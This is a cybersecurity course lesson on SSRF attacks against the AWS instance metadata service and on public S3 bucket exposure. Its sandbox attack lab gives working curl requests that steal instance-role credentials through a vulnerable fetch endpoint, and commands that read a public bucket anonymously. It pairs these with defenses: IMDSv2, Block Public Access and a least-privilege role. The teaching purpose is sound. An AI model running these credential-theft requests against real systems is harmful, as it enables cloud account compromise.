# Day 15 — Instance Metadata, SSRF-to-Cloud, and S3 Exposure

## Objectives

By the end of today you should be able to:

- Explain what the **Instance Metadata Service (IMDS)** is and why an EC2 instance
  queries a local, non-routable address for its own configuration instead of having
  credentials baked into its filesystem or AMI.
- State precisely how **IMDSv1** differs from **IMDSv2**, and why that difference
  specifically defeats a common, realistic class of SSRF exploit — not SSRF in
  general.
- Carry out an **SSRF-to-cloud** attack end to end: use a vulnerable app's own
  server-side URL-fetch feature to reach `169.254.169.254` and steal an EC2 instance
  role's live, temporary AWS credentials — the exact cloud payoff of the SSRF pattern
  Day 9 taught against an internal service.
- Use the stolen temporary credentials to prove real access, and state precisely the
  boundary of what they can and can't reach, based on the instance role's attached
  policy.
- Enumerate and read a misconfigured **public S3 bucket** with zero credentials at
  all, and name the exact settings — **Block Public Access**, **bucket policy** — that
  make that possible and the exact settings that close it.
- Apply three concrete hardening controls — enforce IMDSv2, turn on S3 Block Public
  Access, tighten the instance role to least privilege — and re-verify each one blocks
  the attack it targets, against the same resources, before and after.

## 1. Concept — Metadata, Temporary Credentials, and Where Cloud SSRF Breaks

### Why an instance needs to ask a local address who it is

An EC2 instance often needs AWS credentials to call AWS APIs — write to S3, read a
queue, describe another instance — but hardcoding a long-lived access key into an AMI
or a config file is exactly the kind of secret-sprawl problem Day 10 names: it never
expires on its own, it ships with every copy of the image, and revoking it means
finding and replacing it everywhere. AWS's answer is the **Instance Metadata Service
(IMDS)**: every EC2 instance can reach a fixed, link-local address —
**`169.254.169.254`** — that answers *only from inside that instance's own network
path* with information about itself, including, if an **instance role** is attached,
a fresh set of **temporary credentials** for that role. Nothing has to be baked in;
the instance asks a local address at boot (and any time after) and gets short-lived
credentials handed to it live.

**Temporary credentials** are the mechanism that makes this safe *when nothing else
goes wrong*: an `AccessKeyId` / `SecretAccessKey` / `SessionToken` triple with a real
`Expiration` timestamp, typically valid for a matter of hours, auto-rotated by AWS
without anyone touching the instance. Unlike a leaked long-lived IAM user key (Day
10's concern), a leaked temporary credential set is only dangerous until it expires —
but "until it expires" can still be hours, which is more than enough time for an
attacker to do real damage, as today's attack lab shows.

An **instance role** is just an IAM role whose trust policy allows the EC2 service to
assume it, attached to the instance at launch. Its whole point is: nothing on the
instance needs to *know* a secret — it just asks IMDS, and IMDS hands back whatever
that role is currently allowed to do, in the form of live credentials. Which is also
exactly the problem: **anything that can make the instance issue an HTTP request to
`169.254.169.254` on its behalf can walk out with those same credentials** — including
a completely unrelated bug in an unrelated app running on that instance.

### IMDSv1 vs IMDSv2 — same data, a different door

**IMDSv1** answers plain `GET` requests with no authentication of any kind:

```
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```

The first call lists the attached role's name; the second returns that role's live
credentials as JSON. Nothing about either request needs anything an attacker
couldn't already have if they can make the instance send *any* GET to *any* URL of
their choosing.

**IMDSv2** adds a session-token requirement in front of the same data:

```
PUT  http://169.254.169.254/latest/api/token
     Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
     -> returns an opaque token string

GET  http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
     Header: X-aws-ec2-metadata-token: <token from the PUT above>
```

Same underlying data, same address — but now retrieving it requires **two things a
plain URL-fetch feature typically cannot do**: issuing a request with method `PUT`
(not `GET`), and attaching a custom header to a later request using a value returned
by the first. `--http-put-response-hop-limit 1` (the default) adds a second,
independent barrier: IMDSv2's token request is capped to a single network hop, so it
also fails if the attacker's request path goes through an extra proxy hop the app
itself introduces.

This is the precise reason IMDSv2 matters and precisely what it doesn't fix: it does
**nothing** to stop an attacker who has actual code execution on the instance (they
can just do the PUT themselves) or an SSRF gadget sophisticated enough to set
arbitrary methods and headers on the attacker's behalf. What it *does* stop cold is
the far more common case — a simple SSRF gadget (a "fetch this URL and show me the
body" feature, exactly like today's lab target) that only ever issues a `GET` with no
attacker-controlled headers. That's not a hypothetical narrowing: most real-world SSRF
findings are exactly this shape, which is why AWS made IMDSv2 the default for new
instances and why disabling it (or leaving `HttpTokens=optional`, IMDSv1's behavior)
is a named, current cloud misconfiguration finding in real audits.

### SSRF-to-cloud — Day 9's bug, pointed at a bigger target

Day 9 taught **SSRF** (Server-Side Request Forgery): a server-side feature that fetches
a URL *the attacker controls* lets the attacker make the server issue requests it
never intended to — most usefully, requests to services the server can reach but the
attacker, from outside, cannot. Day 9's lab pointed that same bug at an
internal-only service on the lab network and named `169.254.169.254` explicitly as the
one address you must always treat as forbidden in any SSRF allowlist, precisely
because of what it leads to in a real cloud environment. **Today is that exact payoff,
not a new bug.** The vulnerable app in this lab (`labs/day15`'s "URL preview" service)
is architecturally identical to Day 9's SSRF gadget — it takes a `url` parameter and
fetches it server-side with no allowlist — except this time the internal address on
the other end doesn't return an API response about some other container; it returns a
live, valid credential set for a real IAM role in your AWS account. **SSRF-to-cloud**
is the name for this specific escalation: SSRF that reaches `169.254.169.254` instead
of (or in addition to) some other internal service, turning an SSRF finding — often
scored as "informational" in a purely on-prem context — into full cloud-account
credential theft.

### S3 misconfiguration — exposure that needs no bug at all

The second half of today's attack needs **no vulnerability in any app whatsoever** —
only a misconfigured bucket. **Block Public Access** is an S3-level (and
account-level) switch with four independent settings that, together, can categorically
forbid a bucket from ever being made public no matter what policy or ACL is later
applied to it. A **bucket policy** is a resource-based IAM policy attached directly to
the bucket, written in the same JSON policy language as identity-based IAM policies,
that can grant (or deny) access to specific principals — including, if written
carelessly, `"Principal": "*"`, meaning *anyone on the internet, unauthenticated*. When
Block Public Access is off **and** a bucket policy (or ACL) grants public read, anyone
who finds the bucket's name can list and download its contents with a bare `curl` or
`aws s3 ls --no-sign-request` — no stolen credentials, no SSRF, no exploit of any kind,
just a URL. This is one of the most common real-world cloud breaches precisely because
it requires the attacker to do nothing clever at all.

## 2. Attack Lab — Steal Instance Role Creds, Read a Public Bucket

**Authorized use only:** everything below runs **only** against the EC2 instance and
S3 buckets `labs/day15/setup.sh` creates in **your own AWS sandbox account**, tagged
`purpose=cyberlab-day15`. Never point any of these techniques at an instance, bucket,
or account you don't own or don't have explicit written authorization to test.

### Setup

```sh
cd cyber_security/labs/day15
export AWS_PROFILE=cyberlab-sandbox      # a named profile you've already configured
export ALLOWED_CIDR="$(curl -s https://checkip.amazonaws.com)/32"
./setup.sh
```

`setup.sh` prints the instance's public IP, the two bucket names, and the instance
role name when it finishes. Full detail: [`labs/day15/README.md`](../labs/day15/README.md).

### Step 1 — Recon the vulnerable app

```sh
curl -s "http://<EC2_PUBLIC_IP>:8080/"
```

**What you should see:** a one-line banner naming the app's only real feature: `GET
/fetch?url=<url>` — a "URL preview" endpoint that fetches whatever URL you give it,
server-side, and returns the body. No allowlist, no block on link-local addresses —
architecturally the same bug Day 9 attacked, just a different feature wrapping it.

### Step 2 — SSRF to IMDS: enumerate the instance role's name

```sh
curl -s "http://<EC2_PUBLIC_IP>:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

**What you should see:** a single line naming the attached instance role, e.g.
`cyberlab-day15-instance-role`. This request never touched the target's own
application logic in any meaningful way — the app just forwarded a `GET` to whatever
URL it was handed, and that URL happened to be IMDS.

### Step 3 — SSRF to IMDS: steal the role's temporary credentials

```sh
curl -s "http://<EC2_PUBLIC_IP>:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/cyberlab-day15-instance-role"
```

**What you should see:** a JSON object with `AccessKeyId`, `SecretAccessKey`,
`Token`, and `Expiration` fields — a complete, live, temporary credential set for the
instance's own role, obtained with two plain `curl` requests against an app that never
touched AWS itself. Exactly the SSRF-to-cloud escalation named in Section 1: an
attacker never on the box, never with SSH, never with any AWS credential of their own,
now holds the same live credentials the instance itself uses.

### Step 4 — Use the stolen credentials

```sh
export AWS_ACCESS_KEY_ID=<AccessKeyId from Step 3>
export AWS_SECRET_ACCESS_KEY=<SecretAccessKey from Step 3>
export AWS_SESSION_TOKEN=<Token from Step 3>

aws sts get-caller-identity
aws s3 ls                                                  # every bucket in the account
aws s3 cp "s3://<PRIVATE_BUCKET_NAME>/internal-secret.txt" -
```

**What you should see:** `get-caller-identity` confirms the caller *is* the instance
role, not you — proving the credentials are real and live, not fabricated. Because
this lab's attack baseline attaches the broad **`AmazonS3ReadOnlyAccess`** managed
policy (a deliberately over-permissive starting point, tightened in Defense 3), `aws s3
ls` lists **every** bucket in the account — not just the ones this lab created — and
the private bucket's object, which has **Block Public Access enabled** and no public
policy at all, reads back successfully anyway, because these are real, valid IAM
credentials, not an anonymous request. Full detail: [`labs/day15/SOLUTION.md`](../labs/day15/SOLUTION.md).

### Step 5 — Separately: read the misconfigured public bucket with zero credentials

```sh
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN   # prove this needs none
aws s3 ls "s3://<PUBLIC_BUCKET_NAME>" --no-sign-request
aws s3 cp "s3://<PUBLIC_BUCKET_NAME>/exposed-notes.txt" - --no-sign-request
```

**What you should see:** both commands succeed with `--no-sign-request` — meaning no
AWS credentials of any kind, stolen or otherwise, were involved. This bucket is
readable by *anyone on the internet* who knows or guesses its name, entirely because
of its Block Public Access + bucket policy settings (Section 1), independent of
everything in Steps 1–4.

### Verify

```sh
curl -sf "http://<EC2_PUBLIC_IP>:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
  | grep -q "instance-role" && echo ATTACK_OK
```

Expected: `ATTACK_OK`. Full captured command sequence and real response shapes:
`labs/day15/SOLUTION.md`.

## 3. Defense Lab — IMDSv2, Block Public Access, Least Privilege

Three fixes, re-verified against the exact same resources Section 2 attacked.

### Defense 1 — Enforce IMDSv2

```sh
aws ec2 modify-instance-metadata-options \
  --instance-id <INSTANCE_ID> \
  --http-tokens required \
  --http-put-response-hop-limit 1 \
  --http-endpoint enabled
```

Re-run Step 3's exact SSRF request:

```sh
curl -s "http://<EC2_PUBLIC_IP>:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/cyberlab-day15-instance-role"
```

**What you should see:** `401 Unauthorized` from IMDS itself. **Why:** this app's
`/fetch` feature only ever issues a `GET` with no custom headers (Section 1). IMDSv2
now requires a `PUT` to `/latest/api/token` first, then a `GET` carrying a header with
the token that PUT returned — two capabilities this specific SSRF gadget simply
doesn't have. The bug (the app still fetches any URL you give it) hasn't gone away;
what changed is that reaching IMDS's *credential* data now requires more than this
gadget can do. Nothing about the app's code changed — only the metadata service's own
requirement did, which is why this is a real, general-purpose defense rather than a
patch specific to this one app.

### Defense 2 — S3 Block Public Access

```sh
aws s3api put-public-access-block \
  --bucket <PUBLIC_BUCKET_NAME> \
  --public-access-block-configuration \
    BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true

aws s3api delete-bucket-policy --bucket <PUBLIC_BUCKET_NAME>
```

Re-run Step 5:

```sh
aws s3 ls "s3://<PUBLIC_BUCKET_NAME>" --no-sign-request
```

**What you should see:** `Access Denied`. Turning on all four Block Public Access
settings makes the bucket public-proof at the account/bucket level regardless of what
policy or ACL is (re-)applied later — deleting the permissive policy on top removes
the specific grant that made it public in the first place, so this is two independent
locks, not one.

### Defense 3 — Least-privilege instance role

```sh
aws iam detach-role-policy \
  --role-name cyberlab-day15-instance-role \
  --policy-arn arn:aws:iam::aws:policy/AmazonS3ReadOnlyAccess

aws iam put-role-policy \
  --role-name cyberlab-day15-instance-role \
  --policy-name day15-scoped-s3-read \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Action": ["s3:GetObject", "s3:ListBucket"],
      "Resource": [
        "arn:aws:s3:::<PRIVATE_BUCKET_NAME>",
        "arn:aws:s3:::<PRIVATE_BUCKET_NAME>/*"
      ]
    }]
  }'
```

Re-run Step 4's `aws s3 ls` with a **freshly re-stolen** credential set (temporary
credentials picked up before this change stay valid, under the old permissions, until
their own `Expiration` — this is the honest limit of a policy change: it doesn't
retroactively shrink a credential set already issued, it only changes what the *next*
one can do):

```sh
aws s3 ls                                                   # now: only the private bucket, or none
aws s3 cp "s3://<PRIVATE_BUCKET_NAME>/internal-secret.txt" -   # still works — explicitly scoped in
aws s3 cp "s3://some-other-unrelated-bucket/anything" -        # AccessDenied — no longer broad
```

**What you should see:** the instance role can still do exactly what it's meant to do
(read the one bucket this app legitimately needs) and nothing else — the same stolen
credentials, if stolen again after this change, now hand an attacker a far smaller
blast radius: one bucket, read-only, instead of every bucket in the account.

## 4. Drills

Attempt each drill yourself before reading its solution sketch.

### Drill 1 — The exact SSRF URL to IMDS, and why IMDSv2 stops it

Write the **exact** URL an SSRF gadget needs to fetch to retrieve a named instance
role's temporary credentials from IMDS (assume you already know the role name is
`app-role`). Then explain, in your own words, precisely why enforcing IMDSv2 stops a
simple "fetch this URL, return the body" SSRF gadget from getting anything useful out
of that same address.

**Hint:** re-read Section 1's IMDSv1 vs IMDSv2 subsection — the answer is about which
HTTP *method* and which *headers* each step requires, not about the address changing.

**Solution sketch:** the URL is
`http://169.254.169.254/latest/meta-data/iam/security-credentials/app-role`. Under
IMDSv1 a plain `GET` to that URL returns the credentials directly — exactly what a
simple SSRF gadget can do. Under IMDSv2, that same `GET` alone returns `401
Unauthorized`; retrieving the credentials now requires first sending a `PUT` to
`/latest/api/token` with a `X-aws-ec2-metadata-token-ttl-seconds` header, then repeating
the `GET` with a `X-aws-ec2-metadata-token` header carrying the value that `PUT`
returned. A gadget that only ever issues attacker-URL `GET` requests with no custom
headers (the common, realistic SSRF shape, and exactly this lab's target) can do
neither of those two things, so it never obtains a token and never gets past the first
check — the credential data itself hasn't moved or changed shape, only the door in
front of it has.

### Drill 2 — Fix the bucket policy

You're handed this bucket policy, currently attached to a bucket with Block Public
Access **disabled**:

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": "*",
    "Action": "s3:GetObject",
    "Resource": "arn:aws:s3:::example-bucket/*"
  }]
}
```

State exactly what's wrong with it, and the two independent changes that fix it —
one to the policy itself, one to a bucket-level setting outside the policy entirely.

**Hint:** "wrong" here isn't a syntax error — the JSON is valid and does exactly what
it says. Ask who `"Principal": "*"` actually refers to, and recall Section 1's point
about Block Public Access being able to override a policy's own grant.

**Solution sketch:** `"Principal": "*"` means *any AWS principal, including a
completely unauthenticated request* — this statement is granting `s3:GetObject` on
every object in the bucket to literally anyone on the internet. The policy-level fix
is to remove this statement (or scope `Principal` down to specific account/role ARNs
that actually need access, never `"*"` for a bucket holding anything sensitive). The
independent, bucket-level fix — needed even if the policy were later re-added by
mistake — is enabling all four Block Public Access settings
(`BlockPublicAcls`, `IgnorePublicAcls`, `BlockPublicPolicy`, `RestrictPublicBuckets`),
which makes the bucket immune to being made public by *any* future policy or ACL
change, not just this one. Doing only one of the two leaves a gap: policy-only leaves
the bucket exploitable if someone re-adds a public statement later; BPA-only doesn't
retroactively fix a policy an auditor might still flag as a finding on its own.

### Drill 3 — What the stolen creds can and can't do

After Defense 3 (least-privilege instance role) is applied, an attacker repeats
Section 2's exact SSRF-to-IMDS attack and steals a brand-new set of temporary
credentials. List three things those credentials **can** do and three things they
now **cannot** do, and justify each from the scoped policy in Defense 3.

**Hint:** the scoped policy names exactly two actions (`s3:GetObject`,
`s3:ListBucket`) and exactly one resource (the private bucket and its objects) — every
answer should trace back to "is this action, on this resource, in that list?"

**Solution sketch:**

**Can:**
1. `aws s3 ls s3://<PRIVATE_BUCKET_NAME>` — `s3:ListBucket` is explicitly granted on
   that bucket's ARN.
2. `aws s3 cp s3://<PRIVATE_BUCKET_NAME>/internal-secret.txt -` — `s3:GetObject` is
   explicitly granted on that bucket's object ARN pattern.
3. `aws sts get-caller-identity` — a read-only STS call available to any valid
   credential set regardless of the role's own attached policy; it doesn't touch S3
   at all.

**Cannot:**
1. `aws s3 ls` (list all buckets) — `s3:ListAllMyBuckets` was never granted; only
   `ListBucket` on one specific bucket ARN was.
2. `aws s3 cp s3://some-other-bucket/anything -` — the `Resource` list names only the
   one private bucket's ARN; any other bucket's ARN doesn't match any statement, so it
   falls to the implicit deny.
3. Anything involving another AWS service entirely (e.g. `aws ec2 describe-instances`,
   `aws iam list-users`) — the scoped policy grants exactly two S3 actions and nothing
   else; the attacker holds valid credentials, but a valid credential set can only do
   what its attached policy allows, nothing more.

### Drill 4 — Day 9's fix vs. Day 15's fix: why you want both

Day 9 named blocking `169.254.169.254` (an SSRF allowlist/deny-list at the
*application* layer) as its defense. Today names IMDSv2 (a fix at the *metadata
service* layer) as its defense. If either one alone would have stopped this lab's
exact attack, explain why a real production system should still apply both rather
than picking whichever is more convenient.

**Hint:** think about what happens if the app-layer allowlist has a bug, gap, or gets
removed in a later code change — versus what happens if IMDSv2 enforcement gets
reverted by a misconfigured Terraform apply. Each defense fails independently of the
other.

**Solution sketch:** an SSRF allowlist lives in application code — it's exactly one
missed edge case (a redirect the app follows, an alternate IP encoding of
`169.254.169.254`, a code path that adds a new URL-fetching feature without reusing the
existing filter) away from being bypassed, and it protects nothing once that gap
exists. IMDSv2 lives entirely outside the application — it protects the credential
data itself regardless of what bug is used to reach `169.254.169.254`, including SSRF
variants the app-layer filter never anticipated. Conversely, IMDSv2 doesn't stop an
attacker with actual code execution on the instance (who can just issue the PUT
themselves) or an SSRF gadget sophisticated enough to forward arbitrary methods and
headers — cases where the app-layer allowlist is still the only thing standing between
the attacker and `169.254.169.254` at all. Each defense covers a gap the other one
doesn't; a real system applies both as defense-in-depth, not as alternatives to choose
between.

### Drill 5 — Why yesterday's stolen token is worthless today

An attacker steals a temporary credential set from IMDS today. A week later, they try
reusing the exact same `AccessKeyId` / `SecretAccessKey` / `SessionToken` triple.
Explain what happens and why, referring to a specific field in the JSON IMDS returned.

**Hint:** Section 1 named one specific field in the credential JSON whose entire job
is answering this question.

**Solution sketch:** the request fails — AWS rejects the credentials as expired. Every
temporary credential set IMDS returns includes an `Expiration` timestamp (Section 1),
typically a few hours out from issuance; AWS enforces that timestamp on every API call
using those credentials, independent of anything the instance or the role itself does.
This is the specific property that makes temporary credentials less catastrophic to
leak than a long-lived IAM user access key (Day 10's concern) — a leaked long-lived key
stays valid until someone notices and manually revokes it, possibly forever; a leaked
temporary credential set has a hard, automatic, built-in expiry the attacker cannot
extend. It does **not** mean the theft was harmless — anything the attacker did *before*
expiration (Steps 4 in Section 2) already happened and can't be undone by the
credentials expiring afterward.

## 5. Journal Prompt

Open `journal.md` and write today's entry using the template at the top of that file:

- **What I attacked:** name the exact SSRF URL you used to enumerate the role name,
  the exact URL that returned live credentials, and which specific AWS call you made
  with those stolen credentials to prove they were real.
- **How:** walk through the moment you realized this lab's vulnerable app is
  *architecturally* the same bug as Day 9's SSRF lab — what specifically made that
  click (or not click) for you?
- **What defended it:** of today's three re-verified defenses (IMDSv2, Block Public
  Access, least-privilege role), which one surprised you most in how completely it
  closed the attack, and which one felt like it left the most residual risk even after
  applying it?
- **What confused me:** anything about why a policy change doesn't retroactively
  shrink credentials already issued, or about why IMDSv2 stops this specific gadget but
  wouldn't stop every SSRF variant, that didn't click on first pass.
- **One thing to revisit:** pick one term from today (IMDS, IMDSv2, instance role,
  temporary credentials, Block Public Access, bucket policy, SSRF-to-cloud) to
  re-explain from memory before Day 16, without looking back at this file.
